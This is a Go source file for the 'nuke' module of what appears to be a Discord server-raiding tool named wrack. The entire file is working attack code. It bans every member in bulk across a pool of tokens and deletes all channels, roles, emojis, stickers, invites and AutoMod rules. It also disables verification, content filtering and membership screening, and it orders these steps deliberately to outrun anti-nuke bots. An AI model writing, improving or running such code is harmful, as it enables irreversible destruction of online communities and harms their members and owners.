// Package nuke executes deletion of everything that existed before wrack
// ran. Snapshot-driven: only objects present in the recon snapshot are
// touched, so anything we create mid-run is never deleted by us.
package nuke

import (
	"context"
	"sync"
	"time"

	"github.com/M1noa/wrack/api"
	"github.com/M1noa/wrack/recon"
	"github.com/M1noa/wrack/token"
	"github.com/M1noa/wrack/ui"
	"github.com/M1noa/wrack/work"
)

// Config controls which phases run.
type Config struct {
	GuildID    string
	Short      string // spam name for bio/tag/rules
	Ban        bool   // ban all members
	Kick       bool   // kick instead of ban (if Ban is false)
	DeleteSecs int    // message-deletion window for bans (max 604800)
	SkipBans   bool   // don't ban at all (e.g. --no-ban)
}

// Engine fans out destructive jobs across worker groups.
type Engine struct {
	Cfg     *Config
	Pool    *token.Pool
	Snap    *recon.Snapshot
	Disp    *work.Dispatcher
	Created map[string]bool // IDs created by us; monitor must skip these.
	ctx     context.Context
	mu      sync.Mutex
}

// New builds a Nuke engine.
func New(cfg *Config, pool *token.Pool, snap *recon.Snapshot, disp *work.Dispatcher) *Engine {
	return &Engine{Cfg: cfg, Pool: pool, Snap: snap, Disp: disp, Created: make(map[string]bool)}
}

// TrackCreated records an object we made so we skip it later.
func (e *Engine) TrackCreated(id string) {
	e.mu.Lock()
	e.Created[id] = true
	e.mu.Unlock()
}

func (e *Engine) ours(id string) bool {
	e.mu.Lock()
	defer e.mu.Unlock()
	return e.Created[id]
}

// usable returns tokens that are in-guild with no errors.
func usable(e *Engine) []*token.Token {
	var out []*token.Token
	for _, t := range e.Pool.Tokens {
		if t.InGuild && len(t.Errors) == 0 {
			out = append(out, t)
		}
	}
	return out
}

// nextTok picks the next usable token; nil if none.
func (e *Engine) nextTok() *token.Token { return e.Pool.Next() }

// Run fires every deletion group concurrently. First wave = the ops with
// independent buckets and maximum irreversible impact (guild identity strip +
// bulk bans), submitted before the channel/role storm so they land inside
// anti-nuke reaction time.
func (e *Engine) Run(ctx context.Context) {
	e.ctx = ctx

	// Wave 1: guild settings PATCH is its own bucket — fire immediately.
	go e.StripSettingsAsync(ctx)

	// Wave 2: bulk bans (one request per 200 members).
	var bwg sync.WaitGroup
	bwg.Add(1)
	go func() { defer bwg.Done(); e.banEveryone(ctx) }()

	// Wave 3: everything else, all buckets in parallel.
	var wg sync.WaitGroup
	wg.Add(7)
	go func() { defer wg.Done(); e.deleteAutomod(ctx) }()
	go func() { defer wg.Done(); e.deleteInvites(ctx) }()
	go func() { defer wg.Done(); e.deleteChannels(ctx) }()
	go func() { defer wg.Done(); e.deleteEmojis(ctx) }()
	go func() { defer wg.Done(); e.deleteStickers(ctx) }()
	go func() { defer wg.Done(); e.deleteSounds(ctx) }()
	go func() { defer wg.Done(); e.deleteRoles(ctx) }()
	wg.Wait()
	bwg.Wait()
}

// StripSettingsAsync runs the settings strip on the settings group.
func (e *Engine) StripSettingsAsync(ctx context.Context) {
	done := make(chan struct{})
	e.Disp.Submit("settings", func() {
		defer close(done)
		e.StripSettings(ctx)
	})
	<-done
}

func (e *Engine) deleteChannels(ctx context.Context) {
	var chans []api.Channel
	chans = append(chans, e.Snap.Categories...)
	chans = append(chans, e.Snap.TextVoice...)
	p := &ui.Progress{Label: "del-chan", Total: int64(len(chans))}
	for _, ch := range chans {
		ch := ch
		e.Disp.Submit("delChan", func() {
			t := e.nextTok()
			if t == nil {
				return
			}
			if err := t.Client.DeleteChannel(ctx, ch.ID, "wrack"); err == nil {
				p.Tick(1)
			}
		})
	}
}

func (e *Engine) deleteRoles(ctx context.Context) {
	var deletable []api.Role
	for _, r := range e.Snap.Roles {
		if r.ID != e.Cfg.GuildID && !r.Managed {
			deletable = append(deletable, r)
		}
	}
	p := &ui.Progress{Label: "del-role", Total: int64(len(deletable))}
	for _, r := range deletable {
		r := r
		e.Disp.Submit("delRole", func() {
			t := e.nextTok()
			if t == nil {
				return
			}
			if err := t.Client.DeleteRole(ctx, e.Cfg.GuildID, r.ID, "wrack"); err == nil {
				p.Tick(1)
			}
		})
	}
	go func() {
		for p.Count() < int64(len(deletable)) && ctx.Err() == nil {
			sleepMs(100)
		}
		p.Finish()
	}()
}

func (e *Engine) deleteEmojis(ctx context.Context) {
	p := &ui.Progress{Label: "del-emoji", Total: int64(len(e.Snap.Emojis))}
	for _, em := range e.Snap.Emojis {
		em := em
		e.Disp.Submit("delEmoji", func() {
			t := e.nextTok()
			if t == nil {
				return
			}
			if err := t.Client.DeleteEmoji(ctx, e.Cfg.GuildID, em.ID, "wrack"); err == nil {
				p.Tick(1)
			}
		})
	}
	go func() {
		for p.Count() < int64(len(e.Snap.Emojis)) && ctx.Err() == nil {
			sleepMs(100)
		}
		p.Finish()
	}()
}

func (e *Engine) deleteStickers(ctx context.Context) {
	p := &ui.Progress{Label: "del-sticker", Total: int64(len(e.Snap.Stickers))}
	for _, st := range e.Snap.Stickers {
		st := st
		e.Disp.Submit("delSticker", func() {
			t := e.nextTok()
			if t == nil {
				return
			}
			if err := t.Client.DeleteSticker(ctx, e.Cfg.GuildID, st.ID, "wrack"); err == nil {
				p.Tick(1)
			}
		})
	}
	go func() {
		for p.Count() < int64(len(e.Snap.Stickers)) && ctx.Err() == nil {
			sleepMs(100)
		}
		p.Finish()
	}()
}

func (e *Engine) deleteSounds(ctx context.Context) {
	p := &ui.Progress{Label: "del-sound", Total: int64(len(e.Snap.Sounds))}
	for _, snd := range e.Snap.Sounds {
		snd := snd
		e.Disp.Submit("delSound", func() {
			t := e.nextTok()
			if t == nil {
				return
			}
			if err := t.Client.DeleteSound(ctx, e.Cfg.GuildID, snd.SoundID, "wrack"); err == nil {
				p.Tick(1)
			}
		})
	}
	go func() {
		for p.Count() < int64(len(e.Snap.Sounds)) && ctx.Err() == nil {
			sleepMs(100)
		}
		p.Finish()
	}()
}

func (e *Engine) deleteInvites(ctx context.Context) {
	for _, inv := range e.Snap.Invites {
		inv := inv
		e.Disp.Submit("delInvite", func() {
			t := e.nextTok()
			if t == nil {
				return
			}
			_ = t.Client.DeleteInvite(ctx, inv.Code, "wrack")
		})
	}
}

func (e *Engine) deleteAutomod(ctx context.Context) {
	for _, rule := range e.Snap.AutoMod {
		rule := rule
		e.Disp.Submit("delAuto", func() {
			t := e.nextTok()
			if t == nil {
				return
			}
			_ = t.Client.DeleteAutoModRule(ctx, e.Cfg.GuildID, rule.ID, "wrack")
		})
	}
}

// banEveryone shards the member list into bulk-ban chunks across tokens.
func (e *Engine) banEveryone(ctx context.Context) {
	bulkTokens := e.Pool.WithPerm(api.PermBanMembers, api.PermManageGuild)
	singleTokens := e.Pool.WithPerm(api.PermBanMembers)
	if len(singleTokens) == 0 && len(bulkTokens) == 0 {
		ui.Warn("no tokens with BAN_MEMBERS; skipping ban phase")
		return
	}
	var ids []string
	for _, m := range e.Snap.Members {
		if m.User == nil || m.User.Bot || m.User.ID == "" {
			continue
		}
		ids = append(ids, m.User.ID)
	}
	if len(ids) == 0 {
		ui.Dim("no members to ban (or member fetch failed)")
		return
	}
	p := &ui.Progress{Label: "banning", Total: int64(len(ids))}

	if len(bulkTokens) > 0 {
		for i := 0; i < len(ids); i += 200 {
			end := i + 200
			if end > len(ids) {
				end = len(ids)
			}
			chunk := ids[i:end]
			idx := i / 200
			e.Disp.Submit("ban", func() {
				t := bulkTokens[idx%len(bulkTokens)]
				if _, _, err := t.Client.BulkBan(ctx, e.Cfg.GuildID, chunk, e.Cfg.DeleteSecs); err != nil {
					for _, uid := range chunk {
						st := singleTokens[idx%len(singleTokens)]
						if st != nil {
							if err := st.Client.Ban(ctx, e.Cfg.GuildID, uid, e.Cfg.DeleteSecs, "wrack"); err == nil {
								p.Tick(1)
							}
						}
					}
					return
				}
				p.Tick(int64(len(chunk)))
			})
		}
	} else {
		for _, uid := range ids {
			uid := uid
			e.Disp.Submit("ban", func() {
				t := singleTokens[0]
				if err := t.Client.Ban(ctx, e.Cfg.GuildID, uid, e.Cfg.DeleteSecs, "wrack"); err == nil {
					p.Tick(1)
				}
			})
		}
	}
	go func() {
		for p.Count() < int64(len(ids)) && ctx.Err() == nil {
			sleepMs(100)
		}
		p.Finish()
	}()
}

// StripSettings wipes guild settings to permissive defaults + clears branding.
func (e *Engine) StripSettings(ctx context.Context) {
	body := map[string]any{
		"verification_level":            0,
		"default_message_notifications": 1,
		"explicit_content_filter":       0,
		"afk_timeout":                   60,
		"system_channel_id":             nil,
		"rules_channel_id":              nil,
		"public_updates_channel_id":     nil,
		"icon":                          nil,
		"banner":                        nil,
		"splash":                        nil,
		"discovery_splash":              nil,
		"description":                   "",
		"premium_progress_bar_enabled":  false,
		"tag": "", // best-effort; Discord may 400 this field
	}
	t := e.nextTok()
	if t == nil {
		return
	}
	if _, err := t.Client.ModifyGuild(ctx, e.Cfg.GuildID, body, "wrack"); err != nil {
		delete(body, "tag")
		t.Client.ModifyGuild(ctx, e.Cfg.GuildID, body, "wrack") // retry without tag
	}
	ui.Ok("guild settings stripped")

	for _, tk := range e.Pool.WithPerm(api.PermManageGuild, api.PermManageRoles) {
		if err := tk.Client.SetOnboarding(ctx, e.Cfg.GuildID, false, "wrack"); err == nil {
			ui.Ok("onboarding disabled")
			break
		}
	}
	for _, tk := range e.Pool.WithPerm(api.PermManageGuild) {
		if err := tk.Client.SetWelcomeScreen(ctx, e.Cfg.GuildID, false, "", "wrack"); err == nil {
			ui.Ok("welcome screen disabled")
			break
		}
	}
	for _, tk := range e.Pool.WithPerm(api.PermManageGuild) {
		if err := tk.Client.SetMemberVerification(ctx, e.Cfg.GuildID, false, "", "wrack"); err == nil {
			ui.Ok("membership screening disabled")
			break
		}
	}
}

// SetShortMessage applies --short to bio / tag / rules description.
func (e *Engine) SetShortMessage(ctx context.Context, short string) {
	if short == "" {
		return
	}
	tag := short
	if len(tag) > 4 {
		tag = tag[:4]
	}
	bio := short
	if len(bio) > 300 {
		bio = bio[:300]
	}
	body := map[string]any{"description": bio, "tag": tag}
	t := e.nextTok()
	if t == nil {
		return
	}
	if _, err := t.Client.ModifyGuild(ctx, e.Cfg.GuildID, body, "wrack"); err != nil {
		delete(body, "tag")
		if _, err2 := t.Client.ModifyGuild(ctx, e.Cfg.GuildID, body, "wrack"); err2 == nil {
			ui.Ok("bio set (tag not writable)")
			body = nil
		}
	} else {
		ui.Ok("bio + tag set")
	}
	for _, tk := range e.Pool.WithPerm(api.PermManageGuild) {
		if err := tk.Client.SetMemberVerification(ctx, e.Cfg.GuildID, true, short, "wrack"); err == nil {
			ui.Ok("server rules text set")
			break
		}
	}
}

func sleepMs(ms int) { time.Sleep(time.Duration(ms) * time.Millisecond) }
